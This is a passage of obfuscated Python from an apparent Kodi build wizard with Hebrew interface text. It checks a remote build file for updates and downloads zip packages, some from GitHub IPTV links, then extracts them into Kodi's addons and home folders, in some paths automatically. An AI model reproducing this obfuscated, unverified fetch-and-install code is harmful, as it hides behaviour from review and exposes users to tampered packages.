			if OO00O0OOO0OO00O00 ==True :#line:5165
				OO0OOO00OOOOO00O0 ,O0O00OOO0OO0OO0OO =wiz .splitNotify (NOTIFICATION )#line:5166
				if not OO0OOO00OOOOO00O0 ==False :#line:5168
					try :#line:5169
						OO0OOO00OOOOO00O0 =int (OO0OOO00OOOOO00O0 );OO000O0OO0O0000O0 =int (OO000O0OO0O0000O0 )#line:5170
						checkidupdate ()#line:5171
						wiz .setS ("notedismiss","true")#line:5172
						if OO0OOO00OOOOO00O0 ==OO000O0OO0O0000O0 :#line:5173
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OO0OOO00OOOOO00O0 ),xbmc .LOGNOTICE )#line:5174
						elif OO0OOO00OOOOO00O0 >OO000O0OO0O0000O0 :#line:5176
							wiz .log ("[Notifications] id: %s"%str (OO0OOO00OOOOO00O0 ),xbmc .LOGNOTICE )#line:5177
							wiz .setS ('noteid',str (OO0OOO00OOOOO00O0 ))#line:5178
							wiz .setS ("notedismiss","true")#line:5179
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5182
					except Exception as O00OOO00OO0O0OOO0 :#line:5183
						wiz .log ("Error on Notifications Window: %s"%str (O00OOO00OO0O0OOO0 ),xbmc .LOGERROR )#line:5184
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5186
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO00O0OOO0OO00O00 ),xbmc .LOGNOTICE )#line:5187
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5188
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5189
def checkUpdate ():#line:5191
	OO0OO0000O000OO0O =wiz .getS ('disableupdate')#line:5192
	OOO00O0OOO00OOO0O =wiz .getS ('buildname')#line:5193
	OO0O0OO000O0OOOOO =wiz .getS ('buildversion')#line:5194
	O00O00OO00OO0O00O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5195
	O00OOO0OO000000OO =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%OOO00O0OOO00OOO0O ).findall (O00O00OO00OO0O00O )#line:5196
	if len (O00OOO0OO000000OO )>0 :#line:5197
		O0OOOOOOOOO0O000O =O00OOO0OO000000OO [0 ][0 ]#line:5198
		OOO0OOO0O00OO00OO =O00OOO0OO000000OO [0 ][1 ]#line:5199
		OO0OO0O0OOOO000O0 =O00OOO0OO000000OO [0 ][2 ]#line:5200
		wiz .setS ('latestversion',O0OOOOOOOOO0O000O )#line:5201
		if O0OOOOOOOOO0O000O >OO0O0OO000O0OOOOO :#line:5202
			if OO0OO0000O000OO0O =='false':#line:5203
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(OO0O0OO000O0OOOOO ,O0OOOOOOOOO0O000O ),xbmc .LOGNOTICE )#line:5204
				notify .updateWindow (OOO00O0OOO00OOO0O ,OO0O0OO000O0OOOOO ,O0OOOOOOOOO0O000O ,OOO0OOO0O00OO00OO ,OO0OO0O0OOOO000O0 )#line:5205
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(OO0O0OO000O0OOOOO ,O0OOOOOOOOO0O000O ),xbmc .LOGNOTICE )#line:5206
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(OO0O0OO000O0OOOOO ,O0OOOOOOOOO0O000O ),xbmc .LOGNOTICE )#line:5207
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5208
def updatetelemedia (OOO00OOO0OOO00O0O ):#line:5209
    from startup import teleupdate #line:5210
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5211
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5212
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5213
    wiz .wizardUpdate ('startup')#line:5214
    checkUpdate ()#line:5216
    xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:5217
    time .sleep (15.0 )#line:5218
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5219
     if teleupdate is False :#line:5220
        O00O00OO000O000O0 =(ADDON .getSetting ("autoupdate"))#line:5221
        STARTP2 ()#line:5222
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5223
        if not NOTIFY =='true':#line:5224
            O000O00O0OO0O0O0O =wiz .workingURL (NOTIFICATION )#line:5225
            if O000O00O0OO0O0O0O ==True :#line:5226
                OO000OO0O0OOOOOOO ,O00O00O00O0000OOO =wiz .splitNotify (NOTIFICATION )#line:5227
                if not OO000OO0O0OOOOOOO ==False :#line:5228
                    try :#line:5229
                        OO000OO0O0OOOOOOO =int (OO000OO0O0OOOOOOO );OOO00OOO0OOO00O0O =int (OOO00OOO0OOO00O0O )#line:5230
                        if OO000OO0O0OOOOOOO ==OOO00OOO0OOO00O0O :#line:5231
                            if NOTEDISMISS =='false':#line:5232
                                debridit .debridIt ('update','all')#line:5233
                                traktit .traktIt ('update','all')#line:5234
                                checkidupdatetele ()#line:5235
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (OO000OO0O0OOOOOOO ),xbmc .LOGNOTICE )#line:5236
                        elif OO000OO0O0OOOOOOO >OOO00OOO0OOO00O0O :#line:5237
                            wiz .log ("[Notifications] id: %s"%str (OO000OO0O0OOOOOOO ),xbmc .LOGNOTICE )#line:5238
                            wiz .setS ('noteid',str (OO000OO0O0OOOOOOO ))#line:5239
                            wiz .setS ('notedismiss','false')#line:5240
                            if O00O00OO000O000O0 =='true':#line:5241
                                debridit .debridIt ('update','all')#line:5242
                                traktit .traktIt ('update','all')#line:5243
                                checkidupdatetele ()#line:5244
                            else :notify .notification (msg =O00O00O00O0000OOO )#line:5245
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5246
                    except Exception as O0OO00O00O0O00O00 :#line:5247
                        wiz .log ("Error on Notifications Window: %s"%str (O0OO00O00O0O00O00 ),xbmc .LOGERROR )#line:5248
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5249
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O000O00O0OO0O0O0O ),xbmc .LOGNOTICE )#line:5250
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5251
def checkidupdate ():#line:5255
				wiz .setS ("notedismiss","true")#line:5257
				OO0000OOOOO0OO00O =wiz .workingURL (NOTIFICATION )#line:5258
				OOO0O00000OOOO0O0 =" Kodi Premium"#line:5260
				OOOO00OOOOO00O00O =wiz .checkBuild (OOO0O00000OOOO0O0 ,'gui')#line:5261
				OOOOOO0OO00O0O00O =OOO0O00000OOOO0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5262
				if not wiz .workingURL (OOOO00OOOOO00O00O )==True :return #line:5263
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5264
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO0O00000OOOO0O0 ),'','אנא המתן')#line:5265
				O000OO00000O000OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOO0OO00O0O00O )#line:5266
				try :os .remove (O000OO00000O000OO )#line:5267
				except :pass #line:5268
				logging .warning (OOOO00OOOOO00O00O )#line:5269
				if 'google'in OOOO00OOOOO00O00O :#line:5270
				   OOOOOO0O00OOOOOOO =googledrive_download (OOOO00OOOOO00O00O ,O000OO00000O000OO ,DP ,wiz .checkBuild (OOO0O00000OOOO0O0 ,'filesize'))#line:5271
				else :#line:5274
				  downloader .download (OOOO00OOOOO00O00O ,O000OO00000O000OO ,DP )#line:5275
				xbmc .sleep (100 )#line:5276
				O0OOO0OOO0OOOO000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O00000OOOO0O0 )#line:5277
				DP .update (0 ,O0OOO0OOO0OOOO000 ,'','אנא המתן')#line:5278
				extract .all (O000OO00000O000OO ,HOME ,DP ,title =O0OOO0OOO0OOOO000 )#line:5279
				DP .close ()#line:5280
				wiz .defaultSkin ()#line:5281
				wiz .lookandFeelData ('save')#line:5282
				if KODIV >=18 :#line:5283
					skindialogsettind18 ()#line:5284
				if INSTALLMETHOD ==1 :OOO0O00O0O0O0O000 =1 #line:5287
				elif INSTALLMETHOD ==2 :OOO0O00O0O0O0O000 =0 #line:5288
				else :DP .close ()#line:5289
def checkidupdatetele ():#line:5290
				wiz .setS ("notedismiss","true")#line:5292
				O00OO00O000O00OOO =wiz .workingURL (NOTIFICATION )#line:5293
				O0O00O0O0O000OO00 =" Kodi Premium"#line:5295
				OOO0OO00O0O000OO0 =wiz .checkBuild (O0O00O0O0O000OO00 ,'gui')#line:5296
				O00O0OOOOO0O00O0O =O0O00O0O0O000OO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5297
				if not wiz .workingURL (OOO0OO00O0O000OO0 )==True :return #line:5298
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5299
				OO0OOOO00OO0OO000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0OOOOO0O00O0O )#line:5302
				try :os .remove (OO0OOOO00OO0OO000 )#line:5303
				except :pass #line:5304
				if 'google'in OOO0OO00O0O000OO0 :#line:5306
				   O0OOOO00O000000O0 =googledrive_download (OOO0OO00O0O000OO0 ,OO0OOOO00OO0OO000 ,DP2 ,wiz .checkBuild (O0O00O0O0O000OO00 ,'filesize'))#line:5307
				else :#line:5310
				  downloaderbg .download3 (OOO0OO00O0O000OO0 ,OO0OOOO00OO0OO000 ,DP2 )#line:5311
				xbmc .sleep (100 )#line:5312
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5313
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5315
				extract .all2 (OO0OOOO00OO0OO000 ,HOME ,DP2 )#line:5317
				DP2 .close ()#line:5318
				wiz .defaultSkin ()#line:5319
				wiz .lookandFeelData ('save')#line:5320
				wiz .kodi17Fix ()#line:5321
				if KODIV >=18 :#line:5322
					skindialogsettind18 ()#line:5323
				debridit .debridIt ('restore','all')#line:5328
				traktit .traktIt ('restore','all')#line:5329
				if INSTALLMETHOD ==1 :O00O0OO0OOO000000 =1 #line:5330
				elif INSTALLMETHOD ==2 :O00O0OO0OOO000000 =0 #line:5331
				else :DP2 .close ()#line:5332
				OO0000O00OOOO0O0O =(NOTIFICATION2 )#line:5333
				O0O00000O0O0O0OOO =urllib2 .urlopen (OO0000O00OOOO0O0O )#line:5334
				OOO00OO0OO0OOO00O =O0O00000O0O0O0OOO .readlines ()#line:5335
				O0OO0OO0000OO00OO =0 #line:5336
				for O0OOOOO0O000O00OO in OOO00OO0OO0OOO00O :#line:5339
					if O0OOOOO0O000O00OO .split (' ==')[0 ]=="noreset"or O0OOOOO0O000O00OO .split ()[0 ]=="noreset":#line:5340
						xbmc .executebuiltin ("ReloadSkin()")#line:5342
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5343
						O0000OO0000OO0O00 =(ADDON .getSetting ("message"))#line:5344
						if O0000OO0000OO0O00 =='true':#line:5345
							infobuild ()#line:5346
						update_Votes ()#line:5347
						indicatorfastupdate ()#line:5348
					if O0OOOOO0O000O00OO .split (' ==')[0 ]=="reset"or O0OOOOO0O000O00OO .split ()[0 ]=="reset":#line:5349
						update_Votes ()#line:5351
						indicatorfastupdate ()#line:5352
						resetkodi ()#line:5353
def gaiaserenaddon ():#line:5354
  O0OO000OO0000O0OO =(ADDON .getSetting ("gaiaseren"))#line:5355
  O0O000O0O00OO00OO =(ADDON .getSetting ("auto_rd"))#line:5356
  if O0OO000OO0000O0OO =='true'and O0O000O0O00OO00OO =='true':#line:5357
    OOOOOOO00OO0OOOOO =(NEWFASTUPDATE )#line:5358
    O0000O000O00OO0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5359
    O0OO00OO00OO0O0OO =xbmcgui .DialogProgress ()#line:5360
    O0OO00OO00OO0O0OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5361
    OO00O00OOO00OOOO0 =os .path .join (PACKAGES ,'isr.zip')#line:5362
    OOO00OOOO0O0OO0O0 =urllib2 .Request (OOOOOOO00OO0OOOOO )#line:5363
    OOO0O0O00000000O0 =urllib2 .urlopen (OOO00OOOO0O0OO0O0 )#line:5364
    O000000O0O0000O0O =xbmcgui .DialogProgress ()#line:5366
    O000000O0O0000O0O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5367
    O000000O0O0000O0O .update (0 )#line:5368
    OOO000O00OO0O0000 =open (OO00O00OOO00OOOO0 ,'wb')#line:5370
    try :#line:5372
      OOO000OO0OO0O00OO =OOO0O0O00000000O0 .info ().getheader ('Content-Length').strip ()#line:5373
      O0000OOO00O0OO0O0 =True #line:5374
    except AttributeError :#line:5375
          O0000OOO00O0OO0O0 =False #line:5376
    if O0000OOO00O0OO0O0 :#line:5378
          OOO000OO0OO0O00OO =int (OOO000OO0OO0O00OO )#line:5379
    OOOOO000000000O0O =0 #line:5381
    OOO00O0OO000OOOO0 =time .time ()#line:5382
    while True :#line:5383
          O00O00O00000OOO00 =OOO0O0O00000000O0 .read (8192 )#line:5384
          if not O00O00O00000OOO00 :#line:5385
              sys .stdout .write ('\n')#line:5386
              break #line:5387
          OOOOO000000000O0O +=len (O00O00O00000OOO00 )#line:5389
          OOO000O00OO0O0000 .write (O00O00O00000OOO00 )#line:5390
          if not O0000OOO00O0OO0O0 :#line:5392
              OOO000OO0OO0O00OO =OOOOO000000000O0O #line:5393
          if O000000O0O0000O0O .iscanceled ():#line:5394
             O000000O0O0000O0O .close ()#line:5395
             try :#line:5396
              os .remove (OO00O00OOO00OOOO0 )#line:5397
             except :#line:5398
              pass #line:5399
             break #line:5400
          OO0OO00OOOO0OO0O0 =float (OOOOO000000000O0O )/OOO000OO0OO0O00OO #line:5401
          OO0OO00OOOO0OO0O0 =round (OO0OO00OOOO0OO0O0 *100 ,2 )#line:5402
          OO0O0O00000OO00O0 =OOOOO000000000O0O /(1024 *1024 )#line:5403
          O00O0OOOOOOOO000O =OOO000OO0OO0O00OO /(1024 *1024 )#line:5404
          O0OO000OO00OOO000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O0O00000OO00O0 ,'teal',O00O0OOOOOOOO000O )#line:5405
          if (time .time ()-OOO00O0OO000OOOO0 )>0 :#line:5406
            OOOOO0O000O00O0OO =OOOOO000000000O0O /(time .time ()-OOO00O0OO000OOOO0 )#line:5407
            OOOOO0O000O00O0OO =OOOOO0O000O00O0OO /1024 #line:5408
          else :#line:5409
           OOOOO0O000O00O0OO =0 #line:5410
          OOOO000O000O0OOO0 ='KB'#line:5411
          if OOOOO0O000O00O0OO >=1024 :#line:5412
             OOOOO0O000O00O0OO =OOOOO0O000O00O0OO /1024 #line:5413
             OOOO000O000O0OOO0 ='MB'#line:5414
          if OOOOO0O000O00O0OO >0 and not OO0OO00OOOO0OO0O0 ==100 :#line:5415
              O0000OOOOO0OO0OO0 =(OOO000OO0OO0O00OO -OOOOO000000000O0O )/OOOOO0O000O00O0OO #line:5416
          else :#line:5417
              O0000OOOOO0OO0OO0 =0 #line:5418
          O0OOO0O0O0OO0000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOO0O000O00O0OO ,OOOO000O000O0OOO0 )#line:5419
          O000000O0O0000O0O .update (int (OO0OO00OOOO0OO0O0 ),O0OO000OO00OOO000 ,O0OOO0O0O0OO0000O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5421
    OO0OOO0OO0O0000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5424
    OOO000O00OO0O0000 .close ()#line:5427
    extract .all (OO00O00OOO00OOOO0 ,OO0OOO0OO0O0000O0 ,O000000O0O0000O0O )#line:5428
    try :#line:5432
      os .remove (OO00O00OOO00OOOO0 )#line:5433
    except :#line:5434
      pass #line:5435
def iptvsimpldownpc ():#line:5436
    OO0OO0O0O000OO000 =(IPTVSIMPL18PC )#line:5438
    OOO00O00OO0O0O00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5439
    OO0O00O00OO000O0O =xbmcgui .DialogProgress ()#line:5440
    OO0O00O00OO000O0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5441
    O0OO0O00O00OO0O0O =os .path .join (PACKAGES ,'isr.zip')#line:5442
    O0OO0O00OO00OO0O0 =urllib2 .Request (OO0OO0O0O000OO000 )#line:5443
    OOOO0O0000O00OO0O =urllib2 .urlopen (O0OO0O00OO00OO0O0 )#line:5444
    O0O000OOO00000000 =xbmcgui .DialogProgress ()#line:5446
    O0O000OOO00000000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5447
    O0O000OOO00000000 .update (0 )#line:5448
    OOO000OOOO000O00O =open (O0OO0O00O00OO0O0O ,'wb')#line:5450
    try :#line:5452
      OOO0OO00OOO000O00 =OOOO0O0000O00OO0O .info ().getheader ('Content-Length').strip ()#line:5453
      O0O000OO0O00O0OOO =True #line:5454
    except AttributeError :#line:5455
          O0O000OO0O00O0OOO =False #line:5456
    if O0O000OO0O00O0OOO :#line:5458
          OOO0OO00OOO000O00 =int (OOO0OO00OOO000O00 )#line:5459
    OOO0OO000O0OO0OOO =0 #line:5461
    O0O00O000OOOO0O0O =time .time ()#line:5462
    while True :#line:5463
          O0OOO0OOO0O00OOOO =OOOO0O0000O00OO0O .read (8192 )#line:5464
          if not O0OOO0OOO0O00OOOO :#line:5465
              sys .stdout .write ('\n')#line:5466
              break #line:5467
          OOO0OO000O0OO0OOO +=len (O0OOO0OOO0O00OOOO )#line:5469
          OOO000OOOO000O00O .write (O0OOO0OOO0O00OOOO )#line:5470
          if not O0O000OO0O00O0OOO :#line:5472
              OOO0OO00OOO000O00 =OOO0OO000O0OO0OOO #line:5473
          if O0O000OOO00000000 .iscanceled ():#line:5474
             O0O000OOO00000000 .close ()#line:5475
             try :#line:5476
              os .remove (O0OO0O00O00OO0O0O )#line:5477
             except :#line:5478
              pass #line:5479
             break #line:5480
          OOO0O00000O000000 =float (OOO0OO000O0OO0OOO )/OOO0OO00OOO000O00 #line:5481
          OOO0O00000O000000 =round (OOO0O00000O000000 *100 ,2 )#line:5482
          O000O0O0O00O0OO0O =OOO0OO000O0OO0OOO /(1024 *1024 )#line:5483
          O00000O000O0OO0OO =OOO0OO00OOO000O00 /(1024 *1024 )#line:5484
          O00OO0O0O0OOOOO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000O0O0O00O0OO0O ,'teal',O00000O000O0OO0OO )#line:5485
          if (time .time ()-O0O00O000OOOO0O0O )>0 :#line:5486
            O0OOOO0O0O0O00O00 =OOO0OO000O0OO0OOO /(time .time ()-O0O00O000OOOO0O0O )#line:5487
            O0OOOO0O0O0O00O00 =O0OOOO0O0O0O00O00 /1024 #line:5488
          else :#line:5489
           O0OOOO0O0O0O00O00 =0 #line:5490
          O00000OO000O0O0OO ='KB'#line:5491
          if O0OOOO0O0O0O00O00 >=1024 :#line:5492
             O0OOOO0O0O0O00O00 =O0OOOO0O0O0O00O00 /1024 #line:5493
             O00000OO000O0O0OO ='MB'#line:5494
          if O0OOOO0O0O0O00O00 >0 and not OOO0O00000O000000 ==100 :#line:5495
              O000O0OOOO00OOOOO =(OOO0OO00OOO000O00 -OOO0OO000O0OO0OOO )/O0OOOO0O0O0O00O00 #line:5496
          else :#line:5497
              O000O0OOOO00OOOOO =0 #line:5498
          OO0O0OOOO0OOOO000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOOO0O0O0O00O00 ,O00000OO000O0O0OO )#line:5499
          O0O000OOO00000000 .update (int (OOO0O00000O000000 ),O00OO0O0O0OOOOO0O ,OO0O0OOOO0OOOO000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5501
    O0O0OO0O0OO000000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5504
    OOO000OOOO000O00O .close ()#line:5507
    extract .all (O0OO0O00O00OO0O0O ,O0O0OO0O0OO000000 ,O0O000OOO00000000 )#line:5508
    try :#line:5512
      os .remove (O0OO0O00O00OO0O0O )#line:5513
    except :#line:5514
      pass #line:5515
def iptvkodi18idan ():#line:5516
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5518
              O00O0OO0O0OO00O0O ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5521
              OO0O00OO000O000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5522
              O0O00OO0OO00OO000 =xbmcgui .DialogProgress ()#line:5523
              O0O00OO0OO00OO000 .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5524
              OOO00OO0O0O0O0OO0 =os .path .join (OO0O00OO000O000OO ,'isr.zip')#line:5525
              O0000O0OO0O0O000O =urllib2 .Request (O00O0OO0O0OO00O0O )#line:5526
              O0000O0O000OO00O0 =urllib2 .urlopen (O0000O0OO0O0O000O )#line:5527
              OO0O0O000OOO0O0O0 =xbmcgui .DialogProgress ()#line:5529
              OO0O0O000OOO0O0O0 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5530
              OO0O0O000OOO0O0O0 .update (0 )#line:5531
              O0O0OOOOO00O0000O =open (OOO00OO0O0O0O0OO0 ,'wb')#line:5533
              try :#line:5535
                OOOO00O000000000O =O0000O0O000OO00O0 .info ().getheader ('Content-Length').strip ()#line:5536
                OOOO00O00OO0OOOOO =True #line:5537
              except AttributeError :#line:5538
                    OOOO00O00OO0OOOOO =False #line:5539
              if OOOO00O00OO0OOOOO :#line:5541
                    OOOO00O000000000O =int (OOOO00O000000000O )#line:5542
              O0O0OOOOOOO0OOO00 =0 #line:5544
              OOO0OOO0O00O0O00O =time .time ()#line:5545
              while True :#line:5546
                    O0O00OOOOO0OOO0OO =O0000O0O000OO00O0 .read (8192 )#line:5547
                    if not O0O00OOOOO0OOO0OO :#line:5548
                        sys .stdout .write ('\n')#line:5549
                        break #line:5550
                    O0O0OOOOOOO0OOO00 +=len (O0O00OOOOO0OOO0OO )#line:5552
                    O0O0OOOOO00O0000O .write (O0O00OOOOO0OOO0OO )#line:5553
                    if not OOOO00O00OO0OOOOO :#line:5555
                        OOOO00O000000000O =O0O0OOOOOOO0OOO00 #line:5556
                    if OO0O0O000OOO0O0O0 .iscanceled ():#line:5557
                       OO0O0O000OOO0O0O0 .close ()#line:5558
                       try :#line:5559
                        os .remove (OOO00OO0O0O0O0OO0 )#line:5560
                       except :#line:5561
                        pass #line:5562
                       break #line:5563
                    O00OOO00O0OO00000 =float (O0O0OOOOOOO0OOO00 )/OOOO00O000000000O #line:5564
                    O00OOO00O0OO00000 =round (O00OOO00O0OO00000 *100 ,2 )#line:5565
                    OO0OO0OOOO00OOOO0 =O0O0OOOOOOO0OOO00 /(1024 *1024 )#line:5566
                    OOO0O00OOO0OO0000 =OOOO00O000000000O /(1024 *1024 )#line:5567
                    OOOO000000OO0O000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OO0OOOO00OOOO0 ,'teal',OOO0O00OOO0OO0000 )#line:5568
                    if (time .time ()-OOO0OOO0O00O0O00O )>0 :#line:5569
                      OO00O00OOOO0OO0OO =O0O0OOOOOOO0OOO00 /(time .time ()-OOO0OOO0O00O0O00O )#line:5570
                      OO00O00OOOO0OO0OO =OO00O00OOOO0OO0OO /1024 #line:5571
                    else :#line:5572
                     OO00O00OOOO0OO0OO =0 #line:5573
                    OO00OO0O0O0OOO00O ='KB'#line:5574
                    if OO00O00OOOO0OO0OO >=1024 :#line:5575
                       OO00O00OOOO0OO0OO =OO00O00OOOO0OO0OO /1024 #line:5576
                       OO00OO0O0O0OOO00O ='MB'#line:5577
                    if OO00O00OOOO0OO0OO >0 and not O00OOO00O0OO00000 ==100 :#line:5578
                        OOOO0O00O00O0O000 =(OOOO00O000000000O -O0O0OOOOOOO0OOO00 )/OO00O00OOOO0OO0OO #line:5579
                    else :#line:5580
                        OOOO0O00O00O0O000 =0 #line:5581
                    OO0OO0O0OO00000O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00O00OOOO0OO0OO ,OO00OO0O0O0OOO00O )#line:5582
                    OO0O0O000OOO0O0O0 .update (int (O00OOO00O0OO00000 ),"Downloading "+'iptv',OOOO000000OO0O000 ,OO0OO0O0OO00000O0 )#line:5584
              OO0O0OO000O00OO0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5587
              O0O0OOOOO00O0000O .close ()#line:5590
              extract .all (OOO00OO0O0O0O0OO0 ,OO0O0OO000O00OO0O ,OO0O0O000OOO0O0O0 )#line:5591
              try :#line:5594
                os .remove (OOO00OO0O0O0O0OO0 )#line:5595
              except :#line:5597
                pass #line:5598
              OO0O0O000OOO0O0O0 .close ()#line:5599
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5602
              O00O0OO0O0OO00O0O ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5604
              OO0O00OO000O000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5605
              O0O00OO0OO00OO000 =xbmcgui .DialogProgress ()#line:5606
              O0O00OO0OO00OO000 .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5607
              OOO00OO0O0O0O0OO0 =os .path .join (OO0O00OO000O000OO ,'isr.zip')#line:5608
              O0000O0OO0O0O000O =urllib2 .Request (O00O0OO0O0OO00O0O )#line:5609
              O0000O0O000OO00O0 =urllib2 .urlopen (O0000O0OO0O0O000O )#line:5610
              OO0O0O000OOO0O0O0 =xbmcgui .DialogProgress ()#line:5612
              OO0O0O000OOO0O0O0 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5613
              OO0O0O000OOO0O0O0 .update (0 )#line:5614
              O0O0OOOOO00O0000O =open (OOO00OO0O0O0O0OO0 ,'wb')#line:5616
              try :#line:5618
                OOOO00O000000000O =O0000O0O000OO00O0 .info ().getheader ('Content-Length').strip ()#line:5619
                OOOO00O00OO0OOOOO =True #line:5620
              except AttributeError :#line:5621
                    OOOO00O00OO0OOOOO =False #line:5622
              if OOOO00O00OO0OOOOO :#line:5624
                    OOOO00O000000000O =int (OOOO00O000000000O )#line:5625
              O0O0OOOOOOO0OOO00 =0 #line:5627
              OOO0OOO0O00O0O00O =time .time ()#line:5628
              while True :#line:5629
                    O0O00OOOOO0OOO0OO =O0000O0O000OO00O0 .read (8192 )#line:5630
                    if not O0O00OOOOO0OOO0OO :#line:5631
                        sys .stdout .write ('\n')#line:5632
                        break #line:5633
                    O0O0OOOOOOO0OOO00 +=len (O0O00OOOOO0OOO0OO )#line:5635
                    O0O0OOOOO00O0000O .write (O0O00OOOOO0OOO0OO )#line:5636
                    if not OOOO00O00OO0OOOOO :#line:5638
                        OOOO00O000000000O =O0O0OOOOOOO0OOO00 #line:5639
                    if OO0O0O000OOO0O0O0 .iscanceled ():#line:5640
                       OO0O0O000OOO0O0O0 .close ()#line:5641
                       try :#line:5642
                        os .remove (OOO00OO0O0O0O0OO0 )#line:5643
                       except :#line:5644
                        pass #line:5645
                       break #line:5646
                    O00OOO00O0OO00000 =float (O0O0OOOOOOO0OOO00 )/OOOO00O000000000O #line:5647
                    O00OOO00O0OO00000 =round (O00OOO00O0OO00000 *100 ,2 )#line:5648
                    OO0OO0OOOO00OOOO0 =O0O0OOOOOOO0OOO00 /(1024 *1024 )#line:5649
                    OOO0O00OOO0OO0000 =OOOO00O000000000O /(1024 *1024 )#line:5650
                    OOOO000000OO0O000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OO0OOOO00OOOO0 ,'teal',OOO0O00OOO0OO0000 )#line:5651
                    if (time .time ()-OOO0OOO0O00O0O00O )>0 :#line:5652
                      OO00O00OOOO0OO0OO =O0O0OOOOOOO0OOO00 /(time .time ()-OOO0OOO0O00O0O00O )#line:5653
